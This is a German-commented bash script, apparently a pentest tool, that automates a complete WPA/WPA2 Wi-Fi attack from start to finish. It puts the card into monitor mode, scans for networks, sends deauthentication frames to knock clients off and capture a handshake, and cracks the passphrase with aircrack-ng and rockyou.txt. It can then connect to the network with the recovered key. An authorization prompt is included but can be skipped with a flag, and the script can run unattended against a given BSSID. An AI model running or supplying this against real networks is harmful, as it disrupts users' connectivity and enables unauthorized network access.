#!/usr/bin/env bash
#
# wifi-audit.sh — schlanker, selbstständiger WPA/WPA2-Audit
# =========================================================
# Autorisierter Einsatz nur! Teste ausschließlich Netzwerke, die dir
# gehören oder für die du eine schriftliche Erlaubnis besitzt.
#
# Der komplette Ablauf läuft automatisch:
#   root  ->  Interface  ->  Monitor-Mode  ->  Scan  ->  Ziel waehlen
#         ->  Handshake  ->  Cracken  ->  (optional) Verbinden
#
# Einzige Nachfrage im Standardlauf: welches Netz angegriffen wird.
# Mit -b/--bssid + -c/--channel + -e/--essid laeuft es komplett ohne Rueckfrage.
#
# Nutzung:
#   sudo ./wifi-audit.sh                      # gefuehrt, minimal
#   sudo ./wifi-audit.sh -w /pfad/liste.txt   # eigene Wortliste
#   sudo ./wifi-audit.sh -b AA:BB:.. -c 6 -e "Netz"   # vollautomatisch
#
# ---------------------------------------------------------------------------

# Bewusst KEIN 'set -e': viele Tools (aireplay, aircrack) liefern legitim
# Exit-Codes != 0. Fehler werden gezielt behandelt statt das Script zu killen.
set -o pipefail

# --------------------------------------------------------------------------- #
#  Optik                                                                       #
# --------------------------------------------------------------------------- #
if [ -t 1 ]; then
    R=$'\e[0m';  B=$'\e[1m';  DIM=$'\e[2m'
    RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'
    BLU=$'\e[34m'; CYA=$'\e[36m'; MAG=$'\e[35m'
else
    R=; B=; DIM=; RED=; GRN=; YEL=; BLU=; CYA=; MAG=
fi

info() { printf '%s[*]%s %s\n' "$CYA" "$R" "$*"; }
ok()   { printf '%s[+]%s %s\n' "$GRN" "$R" "$*"; }
warn() { printf '%s[!]%s %s\n' "$YEL" "$R" "$*"; }
err()  { printf '%s[x]%s %s\n' "$RED" "$R" "$*" >&2; }
step() { printf '\n%s%s==>%s %s%s\n' "$B" "$BLU" "$R" "$B$*" "$R"; }

banner() {
    printf '%s' "$CYA"
    cat <<'EOF'
   ┌───────────────────────────────────────────────┐
   │            W I F I  ·  A U D I T               │
   │        WPA / WPA2 Handshake  &  Crack          │
   └───────────────────────────────────────────────┘
EOF
    printf '%s' "$R"
}

# Spinner + Countdown, laeuft solange die uebergebene PID lebt bzw. Zeit ablaeuft
countdown() {
    local secs="$1" label="$2" pid="${3:-}"
    local frames='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏' i=0 end=$((SECONDS + secs))
    while [ "$SECONDS" -lt "$end" ]; do
        if [ -n "$pid" ] && ! kill -0 "$pid" 2>/dev/null; then break; fi
        local f=${frames:i++%${#frames}:1}
        printf '\r  %s%s%s %s %s(%ss)%s   ' \
            "$CYA" "$f" "$R" "$label" "$DIM" "$((end - SECONDS))" "$R"
        sleep 1
    done
    printf '\r\033[K'
}

# --------------------------------------------------------------------------- #
#  Konfiguration / CLI                                                         #
# --------------------------------------------------------------------------- #
IFACE=""; MON=""; BSSID=""; CH=""; ESSID=""
WORDLIST=""
SCAN_TIME=15
CAP_TIME=90
ASSUME_YES=0
WORKDIR=""

usage() {
    cat <<EOF
${B}wifi-audit.sh${R} — schlanker WPA/WPA2-Audit

  -i, --iface <dev>      WLAN-Interface (sonst automatisch erkannt)
  -w, --wordlist <file>  Wortliste (Standard: rockyou.txt)
  -b, --bssid <mac>      Ziel-BSSID (ueberspringt Scan/Auswahl)
  -c, --channel <n>      Ziel-Kanal (mit -b)
  -e, --essid <name>     Ziel-Name (mit -b)
  -s, --scan-time <s>    Scan-Dauer, Standard ${SCAN_TIME}s
  -T, --cap-time <s>     Handshake-Timeout, Standard ${CAP_TIME}s
  -y, --yes              Autorisierungs-Hinweis ohne Nachfrage bestaetigen
  -h, --help             Diese Hilfe
EOF
}

while [ $# -gt 0 ]; do
    case "$1" in
        -i|--iface)     IFACE="$2"; shift 2;;
        -w|--wordlist)  WORDLIST="$2"; shift 2;;
        -b|--bssid)     BSSID="$2"; shift 2;;
        -c|--channel)   CH="$2"; shift 2;;
        -e|--essid)     ESSID="$2"; shift 2;;
        -s|--scan-time) SCAN_TIME="$2"; shift 2;;
        -T|--cap-time)  CAP_TIME="$2"; shift 2;;
        -y|--yes)       ASSUME_YES=1; shift;;
        -h|--help)      usage; exit 0;;
        *) err "Unbekannte Option: $1"; usage; exit 1;;
    esac
done

# --------------------------------------------------------------------------- #
#  Aufraeumen (immer)                                                          #
# --------------------------------------------------------------------------- #
NM_STOPPED=0
cleanup() {
    trap - EXIT INT TERM
    printf '\r\033[K'
    [ -n "${SCAN_PID:-}" ] && kill "$SCAN_PID" 2>/dev/null
    [ -n "${CAP_PID:-}"  ] && kill "$CAP_PID"  2>/dev/null
    if [ -n "$MON" ]; then
        info "Beende Monitor-Mode ($MON) ..."
        airmon-ng stop "$MON" >/dev/null 2>&1
    fi
    if [ "$NM_STOPPED" -eq 1 ]; then
        info "Starte NetworkManager neu ..."
        systemctl restart NetworkManager >/dev/null 2>&1 \
            || service network-manager restart >/dev/null 2>&1 \
            || true
    fi
    [ -n "$WORKDIR" ] && rm -rf "$WORKDIR" 2>/dev/null
}
trap cleanup EXIT INT TERM

have() { command -v "$1" >/dev/null 2>&1; }

# --------------------------------------------------------------------------- #
#  1) Autorisierung                                                            #
# --------------------------------------------------------------------------- #
banner
if [ "$ASSUME_YES" -ne 1 ]; then
    printf '%s%s  Nur autorisierte Netzwerke testen (eigene oder mit Erlaubnis).%s\n' "$YEL" "$B" "$R"
    printf '  Fortfahren? %s[j/N]%s ' "$DIM" "$R"
    read -r ans
    case "$ans" in
        j|J|y|Y|ja|Ja|yes) ;;
        *) err "Abgebrochen."; exit 1;;
    esac
fi

# --------------------------------------------------------------------------- #
#  2) Root sicherstellen (auto re-exec)                                        #
# --------------------------------------------------------------------------- #
if [ "$(id -u)" -ne 0 ]; then
    if have sudo; then
        info "Root benoetigt — starte mit sudo neu ..."
        # Autorisierung ist bereits bestaetigt -> nach re-exec nicht erneut fragen
        exec sudo -E -- "$0" "$@" -y
    fi
    err "Bitte als root ausfuehren."; exit 1
fi

# --------------------------------------------------------------------------- #
#  3) Abhaengigkeiten                                                          #
# --------------------------------------------------------------------------- #
step "Werkzeuge pruefen"
CORE=(iw airmon-ng airodump-ng aireplay-ng aircrack-ng)
missing=()
for t in "${CORE[@]}"; do have "$t" || missing+=("$t"); done
if [ "${#missing[@]}" -gt 0 ]; then
    warn "Fehlt: ${missing[*]}"
    if have apt-get; then
        info "Installiere aircrack-ng + iw ..."
        apt-get update -qq >/dev/null 2>&1
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq aircrack-ng iw >/dev/null 2>&1
    fi
    still=()
    for t in "${CORE[@]}"; do have "$t" || still+=("$t"); done
    if [ "${#still[@]}" -gt 0 ]; then
        err "Konnte nicht installieren: ${still[*]}"; exit 1
    fi
fi
ok "Alle Kernwerkzeuge vorhanden."

WORKDIR="$(mktemp -d /tmp/wifi-audit.XXXXXX)"

# --------------------------------------------------------------------------- #
#  4) Interface automatisch erkennen                                          #
# --------------------------------------------------------------------------- #
step "WLAN-Interface"
mapfile -t IFACES < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
if [ -z "$IFACE" ]; then
    if [ "${#IFACES[@]}" -eq 0 ]; then
        err "Kein WLAN-Interface gefunden."; exit 1
    elif [ "${#IFACES[@]}" -eq 1 ]; then
        IFACE="${IFACES[0]}"
    else
        info "Mehrere Interfaces gefunden:"
        for n in "${!IFACES[@]}"; do
            printf '   %s%s)%s %s\n' "$CYA" "$((n+1))" "$R" "${IFACES[$n]}"
        done
        printf '  Auswahl %s[1-%s]:%s ' "$DIM" "${#IFACES[@]}" "$R"
        read -r sel
        IFACE="${IFACES[$((sel-1))]:-${IFACES[0]}}"
    fi
fi
ok "Interface: ${B}${IFACE}${R}"

# --------------------------------------------------------------------------- #
#  5) Monitor-Mode aktivieren                                                  #
# --------------------------------------------------------------------------- #
step "Monitor-Mode aktivieren"
rfkill unblock wifi 2>/dev/null || true
# Stoerprozesse killen (NetworkManager etc.) — Hauptursache fuer "haengt beim Scan"
if have systemctl && systemctl is-active --quiet NetworkManager 2>/dev/null; then
    NM_STOPPED=1
fi
airmon-ng check kill >/dev/null 2>&1
airmon-ng start "$IFACE" >/dev/null 2>&1

# Monitor-Interface robust erkennen (Name kann gleich bleiben oder <if>mon werden)
detect_monitor() {
    local m
    m=$(iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i; exit}')
    if [ -n "$m" ]; then echo "$m"; return; fi
    for cand in "${IFACE}mon" "${IFACE}" mon0; do
        if iw dev "$cand" info >/dev/null 2>&1; then echo "$cand"; return; fi
    done
}
MON="$(detect_monitor)"
if [ -z "$MON" ]; then
    err "Monitor-Mode konnte nicht aktiviert werden."; exit 1
fi
ok "Monitor-Interface: ${B}${MON}${R}"

# --------------------------------------------------------------------------- #
#  6) Scan  (robust — haengt NICHT)                                            #
# --------------------------------------------------------------------------- #
# Der klassische Bug: 'timeout airodump-ng ...' bleibt haengen, weil airodump
# SIGTERM abfaengt. Loesung: im Hintergrund starten, sauber per SIGINT beenden,
# frisch geflushte CSV (--write-interval) einlesen.
declare -a NET_BSSID NET_CH NET_ENC NET_PWR NET_ESSID

do_scan() {
    local prefix="$WORKDIR/scan"
    rm -f "${prefix}"-*.csv 2>/dev/null
    airodump-ng --write-interval 1 --output-format csv \
        -w "$prefix" "$MON" >/dev/null 2>&1 &
    SCAN_PID=$!
    countdown "$SCAN_TIME" "Suche Netzwerke" "$SCAN_PID"
    kill -INT "$SCAN_PID" 2>/dev/null
    wait "$SCAN_PID" 2>/dev/null
    SCAN_PID=""

    local csv
    csv=$(ls -1t "${prefix}"-*.csv 2>/dev/null | head -n1)
    [ -f "$csv" ] || { err "Scan lieferte keine Daten."; return 1; }

    NET_BSSID=(); NET_CH=(); NET_ENC=(); NET_PWR=(); NET_ESSID=()
    # Nur AP-Sektion (vor 'Station MAC'); ESSID kann Kommas enthalten -> 14..NF-1
    while IFS=$'\t' read -r pwr ch enc bssid essid; do
        [ -z "$bssid" ] && continue
        NET_PWR+=("$pwr"); NET_CH+=("$ch"); NET_ENC+=("$enc")
        NET_BSSID+=("$bssid"); NET_ESSID+=("$essid")
    done < <(awk -F',' '
        { gsub(/\r/,"") }
        /^Station MAC/ { exit }
        $1 ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ && NF >= 14 {
            bssid=$1; ch=$4; enc=$6; pwr=$9; essid=""
            for (i=14; i<NF; i++) essid = essid (i>14 ? "," : "") $i
            gsub(/^ +| +$/, "", bssid); gsub(/^ +| +$/, "", ch)
            gsub(/^ +| +$/, "", enc);   gsub(/^ +| +$/, "", pwr)
            gsub(/^ +| +$/, "", essid)
            if (essid == "") essid = "<versteckt>"
            print pwr "\t" ch "\t" enc "\t" bssid "\t" essid
        }' "$csv" | sort -t$'\t' -k1,1nr)

    [ "${#NET_BSSID[@]}" -gt 0 ]
}

# Signalstaerke -> Balken (robust: nicht-numerische Werte -> schwach)
sig_bar() {
    local p="$1"
    case "$p" in -[0-9]*|[0-9]*) ;; *) p=-100;; esac
    if   [ "$p" -ge -50 ]; then printf '%s▇▇▇▇%s' "$GRN" "$R"
    elif [ "$p" -ge -60 ]; then printf '%s▆▆▆%s%s▁%s' "$GRN" "$R" "$DIM" "$R"
    elif [ "$p" -ge -70 ]; then printf '%s▅▅%s%s▁▁%s' "$YEL" "$R" "$DIM" "$R"
    elif [ "$p" -ge -80 ]; then printf '%s▃%s%s▁▁▁%s' "$YEL" "$R" "$DIM" "$R"
    else                        printf '%s▁%s%s▁▁▁%s' "$RED" "$R" "$DIM" "$R"
    fi
}

enc_tag() {
    case "$1" in
        *WPA3*) printf '%sWPA3%s' "$MAG" "$R";;
        *WPA2*) printf '%sWPA2%s' "$GRN" "$R";;
        *WPA*)  printf '%sWPA %s' "$GRN" "$R";;
        *WEP*)  printf '%sWEP %s' "$YEL" "$R";;
        *OPN*|"") printf '%sOPEN%s' "$CYA" "$R";;
        *) printf '%-4s' "$1";;
    esac
}

# --------------------------------------------------------------------------- #
#  Ziel bestimmen                                                              #
# --------------------------------------------------------------------------- #
if [ -n "$BSSID" ]; then
    step "Ziel (vorgegeben)"
    ok "BSSID ${B}${BSSID}${R}  Kanal ${B}${CH:-?}${R}  ${ESSID:-}"
else
    step "Netzwerk-Scan"
    if ! do_scan; then
        err "Keine Netzwerke gefunden. Naeher rangehen oder -s erhoehen."
        exit 1
    fi
    printf '\n  %s%3s  %-8s %-5s %-5s  %-17s %s%s\n' \
        "$B" "#" "SIGNAL" "dBm" "KAN" "BSSID" "NAME" "$R"
    printf '  %s%s%s\n' "$DIM" "────────────────────────────────────────────────────────────" "$R"
    for i in "${!NET_BSSID[@]}"; do
        printf '  %s%3s%s  %b %4s  %-5s  %-17s %s\n' \
            "$CYA" "$((i+1))" "$R" \
            "$(sig_bar "${NET_PWR[$i]}")" \
            "${NET_PWR[$i]}" "${NET_CH[$i]}" \
            "$(enc_tag "${NET_ENC[$i]}")" \
            "${NET_ESSID[$i]}"
    done
    echo
    printf '  Ziel %s[1-%s]:%s ' "$DIM" "${#NET_BSSID[@]}" "$R"
    read -r pick
    idx=$((pick-1))
    if [ -z "${NET_BSSID[$idx]:-}" ]; then err "Ungueltige Auswahl."; exit 1; fi
    BSSID="${NET_BSSID[$idx]}"
    CH="${NET_CH[$idx]}"
    ESSID="${NET_ESSID[$idx]}"
    ENC="${NET_ENC[$idx]}"
    ok "Ziel: ${B}${ESSID}${R}  (${BSSID}, Kanal ${CH})"
    if printf '%s' "$ENC" | grep -q 'WPA3'; then
        warn "WPA3 hat keinen Offline-Handshake-Angriff — Abbruch empfohlen."
    fi
fi

# --------------------------------------------------------------------------- #
#  7) Handshake mitschneiden (+ gezielter Deauth)                             #
# --------------------------------------------------------------------------- #
step "Handshake mitschneiden"
CAP_PREFIX="$WORKDIR/hs"
rm -f "${CAP_PREFIX}"-*.cap 2>/dev/null
airodump-ng -c "$CH" --bssid "$BSSID" -w "$CAP_PREFIX" \
    --output-format cap "$MON" >/dev/null 2>&1 &
CAP_PID=$!
sleep 2

got_handshake() {
    local cap; cap=$(ls -1t "${CAP_PREFIX}"-*.cap 2>/dev/null | head -n1)
    [ -n "$cap" ] || return 1
    aircrack-ng "$cap" 2>/dev/null | grep -qE '\b1 handshake\b|WPA \(1 handshake\)'
}

info "Deauth-Impulse gegen ${BSSID} ..."
HS=0
end=$((SECONDS + CAP_TIME))
while [ "$SECONDS" -lt "$end" ]; do
    aireplay-ng --deauth 4 -a "$BSSID" "$MON" >/dev/null 2>&1
    local_i=0
    while [ "$local_i" -lt 4 ]; do
        printf '\r  %s⠿%s warte auf Handshake %s(%ss)%s   ' \
            "$CYA" "$R" "$DIM" "$((end - SECONDS))" "$R"
        sleep 1; local_i=$((local_i+1))
        [ "$SECONDS" -ge "$end" ] && break
    done
    if got_handshake; then HS=1; break; fi
done
printf '\r\033[K'
kill -INT "$CAP_PID" 2>/dev/null; wait "$CAP_PID" 2>/dev/null; CAP_PID=""

CAP=$(ls -1t "${CAP_PREFIX}"-*.cap 2>/dev/null | head -n1)
if [ "$HS" -ne 1 ]; then
    err "Kein Handshake in ${CAP_TIME}s. Naeher ran, Client aktiv? -T erhoehen."
    exit 1
fi
ok "Handshake erfasst: ${DIM}${CAP}${R}"

# --------------------------------------------------------------------------- #
#  8) Wortliste bestimmen                                                      #
# --------------------------------------------------------------------------- #
step "Wortliste"
if [ -z "$WORDLIST" ]; then
    for cand in /usr/share/wordlists/rockyou.txt \
                /usr/share/wordlists/rockyou.txt.gz \
                /usr/share/wordlists/fern-wifi/common.txt; do
        if [ -f "$cand" ]; then WORDLIST="$cand"; break; fi
    done
fi
if [ "${WORDLIST##*.}" = "gz" ] && [ -f "$WORDLIST" ]; then
    info "Entpacke $(basename "$WORDLIST") ..."
    gunzip -kf "$WORDLIST" 2>/dev/null
    WORDLIST="${WORDLIST%.gz}"
fi
if [ -z "$WORDLIST" ] || [ ! -f "$WORDLIST" ]; then
    printf '  Pfad zur Wortliste: '
    read -r WORDLIST
fi
if [ ! -f "$WORDLIST" ]; then err "Wortliste nicht gefunden."; exit 1; fi
ok "Wortliste: ${B}${WORDLIST}${R}"

# --------------------------------------------------------------------------- #
#  9) Cracken                                                                  #
# --------------------------------------------------------------------------- #
step "Passwort cracken"
info "aircrack-ng laeuft ... (Abbruch mit Strg-C)"
KEYFILE="$WORKDIR/key.txt"
aircrack-ng -q -b "$BSSID" -w "$WORDLIST" -l "$KEYFILE" "$CAP" 2>/dev/null

if [ -s "$KEYFILE" ]; then
    KEY="$(cat "$KEYFILE")"
    echo
    printf '%s%s┌──────────────────────────────────────────────┐%s\n' "$B" "$GRN" "$R"
    printf '%s%s│  PASSWORT GEFUNDEN                            │%s\n' "$B" "$GRN" "$R"
    printf '%s%s└──────────────────────────────────────────────┘%s\n' "$B" "$GRN" "$R"
    printf '   Netz:     %s%s%s\n' "$B" "${ESSID:-?}" "$R"
    printf '   Passwort: %s%s%s%s\n' "$B" "$GRN" "$KEY" "$R"
    echo

    # ------------------------------------------------------------------- #
    # 10) Optional verbinden                                              #
    # ------------------------------------------------------------------- #
    if [ "$ASSUME_YES" -ne 1 ] && [ -n "$ESSID" ] && have nmcli; then
        printf '  Jetzt mit "%s" verbinden? %s[j/N]%s ' "$ESSID" "$DIM" "$R"
        read -r c
        case "$c" in
            j|J|y|Y|ja|yes)
                info "Beende Monitor-Mode und verbinde ..."
                airmon-ng stop "$MON" >/dev/null 2>&1; MON=""
                systemctl restart NetworkManager >/dev/null 2>&1; NM_STOPPED=0
                sleep 3
                if nmcli dev wifi connect "$ESSID" password "$KEY"; then
                    ok "Verbunden mit ${ESSID}."
                else
                    err "Verbindung fehlgeschlagen."
                fi;;
        esac
    fi
    exit 0
else
    err "Passwort nicht in der Wortliste. Groessere Liste probieren."
    exit 2
fi
